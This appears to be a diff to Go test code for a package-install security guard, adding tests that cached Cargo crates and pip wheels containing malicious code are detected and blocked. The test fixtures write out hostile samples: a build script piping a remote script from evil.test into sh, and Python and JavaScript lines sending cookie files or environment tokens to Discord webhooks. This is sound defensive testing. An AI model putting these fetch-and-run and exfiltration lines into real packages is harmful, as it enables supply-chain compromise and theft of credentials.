@@ -2,6 +2,7 @@ package cli
 
 import (
 	"archive/tar"
+	"archive/zip"
 	"bytes"
 	"compress/gzip"
 	"context"
@@ -39,6 +40,27 @@ func makeTGZ(t *testing.T, files map[string]string) []byte {
 	}
 	if err := gz.Close(); err != nil {
 		t.Fatalf("gzip close: %v", err)
+	}
+	return buf.Bytes()
+}
+
+// makeZip builds an in-memory zip archive from path->contents, mimicking a
+// Python wheel (.whl is a zip).
+func makeZip(t *testing.T, files map[string]string) []byte {
+	t.Helper()
+	var buf bytes.Buffer
+	zw := zip.NewWriter(&buf)
+	for name, body := range files {
+		w, err := zw.Create(name)
+		if err != nil {
+			t.Fatalf("zip create %s: %v", name, err)
+		}
+		if _, err := w.Write([]byte(body)); err != nil {
+			t.Fatalf("zip write %s: %v", name, err)
+		}
+	}
+	if err := zw.Close(); err != nil {
+		t.Fatalf("zip close: %v", err)
 	}
 	return buf.Bytes()
 }
@@ -318,6 +340,131 @@ func TestNpmCacheArtifactBytes(t *testing.T) {
 	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "cached-evil", Version: "3.0.0"})
 	if !v.Block {
 		t.Fatalf("guard must block a cached malicious package with no staging dir, got %+v", v)
+	}
+}
+
+func TestCargoCacheArtifactBytes(t *testing.T) {
+	crate := makeTGZ(t, map[string]string{
+		"cached-crate-2.0.0/Cargo.toml": "[package]\nname = \"cached-crate\"\nversion = \"2.0.0\"\nbuild = \"build.rs\"\n",
+		"cached-crate-2.0.0/build.rs":   "fn main() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl https://evil.test/x.sh | sh\").status().unwrap(); }\n",
+	})
+	home := t.TempDir()
+	// Cargo stages the download at registry/cache/<registry-hash>/<name>-<ver>.crate.
+	cacheDir := filepath.Join(home, "registry", "cache", "github.com-1ecc6299db9ec823")
+	if err := os.MkdirAll(cacheDir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(cacheDir, "cached-crate-2.0.0.crate"), crate, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	t.Setenv("CARGO_HOME", home)
+	t.Setenv(guardArtifactDirEnv, "") // force the cache path, not the staged dir
+
+	got := cargoCacheArtifactBytes(packageSpec{Ecosystem: "cargo", Name: "cached-crate", Version: "2.0.0"})
+	if !bytes.Equal(got, crate) {
+		t.Fatalf("cargo cache read returned %d bytes, want the staged %d", len(got), len(crate))
+	}
+	// Unpinned -> nil (fail-open).
+	if b := cargoCacheArtifactBytes(packageSpec{Ecosystem: "cargo", Name: "cached-crate"}); b != nil {
+		t.Errorf("unpinned spec must not resolve from cache, got %d bytes", len(b))
+	}
+	// Missing crate -> nil.
+	if b := cargoCacheArtifactBytes(packageSpec{Ecosystem: "cargo", Name: "absent", Version: "9.9.9"}); b != nil {
+		t.Errorf("missing crate must return nil, got %d bytes", len(b))
+	}
+	// Missing CARGO_HOME dir -> nil (fail-open).
+	t.Setenv("CARGO_HOME", filepath.Join(home, "does-not-exist"))
+	if b := cargoCacheArtifactBytes(packageSpec{Ecosystem: "cargo", Name: "cached-crate", Version: "2.0.0"}); b != nil {
+		t.Errorf("missing cargo cache dir must return nil, got %d bytes", len(b))
+	}
+	t.Setenv("CARGO_HOME", home)
+
+	// And the guard blocks it end-to-end via the cache, no staging dir.
+	g := newLocalGuard()
+	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "cargo", Name: "cached-crate", Version: "2.0.0"})
+	if !v.Block {
+		t.Fatalf("guard must block a cached malicious crate with no staging dir, got %+v", v)
+	}
+}
+
+func TestPipCacheArtifactBytes(t *testing.T) {
+	// A wheel is a zip; analyzeArtifact("pip", …) reads its source bodies. Embed
+	// a Discord webhook in a module so the IOC scan blocks (wheels lack setup.py,
+	// so the install-script detector never fires — this is the coverage a
+	// wheel-cache hit adds).
+	whl := makeZip(t, map[string]string{
+		"cached_pkg/__init__.py": "import requests\nrequests.post('https://discord.com/api/webhooks/123/abc', data=open('cookies.sqlite','rb').read())\n",
+	})
+	root := t.TempDir()
+	// pip sards wheels under wheels/<a>/<b>/<c>/<hash>/<file>.whl.
+	wheelDir := filepath.Join(root, "wheels", "a", "b", "c", "0123456789abcdef")
+	if err := os.MkdirAll(wheelDir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(wheelDir, "cached_pkg-1.2.3-py3-none-any.whl"), whl, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	t.Setenv("PIP_CACHE_DIR", root)
+	t.Setenv(guardArtifactDirEnv, "") // force the cache path, not the staged dir
+
+	// Name given with a dash resolves via PEP 503 normalization to the underscore
+	// wheel filename.
+	got := pipCacheArtifactBytes(packageSpec{Ecosystem: "pip", Name: "cached-pkg", Version: "1.2.3"})
+	if !bytes.Equal(got, whl) {
+		t.Fatalf("pip cache read returned %d bytes, want the staged %d", len(got), len(whl))
+	}
+	// Unpinned -> nil (fail-open).
+	if b := pipCacheArtifactBytes(packageSpec{Ecosystem: "pip", Name: "cached-pkg"}); b != nil {
+		t.Errorf("unpinned spec must not resolve from cache, got %d bytes", len(b))
+	}
+	// Missing wheel -> nil.
+	if b := pipCacheArtifactBytes(packageSpec{Ecosystem: "pip", Name: "absent", Version: "9.9.9"}); b != nil {
+		t.Errorf("missing wheel must return nil, got %d bytes", len(b))
+	}
+	// Missing cache dir -> nil (fail-open).
+	t.Setenv("PIP_CACHE_DIR", filepath.Join(root, "does-not-exist"))
+	if b := pipCacheArtifactBytes(packageSpec{Ecosystem: "pip", Name: "cached-pkg", Version: "1.2.3"}); b != nil {
+		t.Errorf("missing pip cache dir must return nil, got %d bytes", len(b))
+	}
+	t.Setenv("PIP_CACHE_DIR", root)
+
+	// And the guard blocks it end-to-end via the cache, no staging dir.
+	g := newLocalGuard()
+	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "pip", Name: "cached-pkg", Version: "1.2.3"})
+	if !v.Block {
+		t.Fatalf("guard must block a cached malicious wheel with no staging dir, got %+v", v)
+	}
+}
+
+func TestAnalyzeArtifact_EmbeddedIOCHost(t *testing.T) {
+	// A JS source embedding a Discord webhook exfil sink — an in-no-feed IOC the
+	// name lookup can never catch. Cross-ecosystem: the IOC scan runs regardless
+	// of the manifest.
+	tgz := makeTGZ(t, map[string]string{
+		"package/package.json": `{"name":"looks-fine","version":"1.0.0"}`,
+		"package/index.js":     "fetch('https://discord.com/api/webhooks/999/deadbeef', {method:'POST', body: process.env.TOKEN});\n",
+	})
+	v := analyzeArtifact("npm", tgz)
+	if !v.Block {
+		t.Fatalf("expected BLOCK for embedded exfil-webhook IOC, got %+v", v)
+	}
+	if v.Severity != "behavioral-high" {
+		t.Errorf("severity = %q, want behavioral-high", v.Severity)
+	}
+	if !strings.Contains(v.Reason, "malicious indicator") {
+		t.Errorf("reason = %q, want it to mention the malicious indicator", v.Reason)
+	}
+}
+
+func TestAnalyzeArtifact_BenignSourceNoIOC(t *testing.T) {
+	// Ordinary source that fetches from a legitimate CDN must NOT trip the IOC
+	// scan — the false-positive guard.
+	tgz := makeTGZ(t, map[string]string{
+		"package/package.json": `{"name":"benign","version":"1.0.0"}`,
+		"package/index.js":     "const x = require('lodash');\nfetch('https://registry.npmjs.org/lodash');\nmodule.exports = x;\n",
+	})
+	if v := analyzeArtifact("npm", tgz); v.Block {
+		t.Fatalf("benign source must not block on the IOC scan, got %+v", v)
 	}
 }
 
